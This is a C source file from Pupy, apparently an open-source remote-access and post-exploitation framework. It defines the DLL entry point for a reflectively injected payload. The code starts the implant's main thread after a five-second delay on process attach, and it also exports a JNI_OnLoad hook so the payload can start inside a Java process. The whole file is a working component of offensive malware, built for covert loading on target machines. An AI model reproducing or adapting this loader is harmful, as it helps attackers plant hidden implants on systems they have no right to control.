/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <windows.h>
#include "pupy_load.h"
#include "ReflectiveDllInjection.h"
#include "debug.h"

extern HINSTANCE hAppInstance;
extern void * __JVM;

#define REFLECTIVE_SPECIAL 5

HANDLE hThread = NULL;

//===============================================================================================//

DWORD WINAPI delayedMainThread(LPVOID lpArg)
{
    Sleep(5000);
    return mainThread(lpArg);
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    DWORD threadId;
    BOOL bReturnValue = TRUE;

    dprint("Call DllMain %d/%p\n", dwReason, lpReserved);

    switch( dwReason )
    {
        case DLL_QUERY_HMODULE:
            if( lpReserved != NULL )
                *(HMODULE *)lpReserved = hAppInstance;
        break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;

            if (lpReserved == 0x1) {
                dprint("Special: Request for non-delayed thread\n");
                mainThread(NULL);
                return TRUE;
            }

            if (!hThread) {
                dprint("Creating delayed thread from DllMain\n");

                hThread = CreateThread(
                    NULL,
                    0,      // dwStackSize
                    (LPTHREAD_START_ROUTINE) delayedMainThread,     // lpStartAddress
                    NULL,       // lpParameter
                    0,      // dwCreationFlags (0==run right after creation)
                    &threadId
               );
            } else {
                dprint("Thread already exists\n");
            }
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            dprint("Call deinitializer: %d\n", dwReason);
            if (hThread) {
                dprint("Wait until %p exited, reason: %d\n", hThread, dwReason);
                WaitForMultipleObjects(1, &hThread, TRUE, INFINITE);
                dprint("%p exited, completed\n", hThread);
            }

            break;
    }

    dprint("Call DllMain - completed\n");
    return bReturnValue;
}

__declspec(dllexport)
int JNI_OnLoad(void *vm, void *reserved) {
    DWORD threadId;

    dprint("Call JNI_OnLoad\n");

    __JVM = vm;

    if (!hThread) {
        dprint("Crearting thread from JNI_OnLoad\n");
        hThread = CreateThread(
            NULL,
            0,      // dwStackSize
            mainThread,     // lpStartAddress
            NULL,       // lpParameter
            0,      // dwCreationFlags (0==run right after creation)
            &threadId
        );
    }

    return 0x00010006;
}
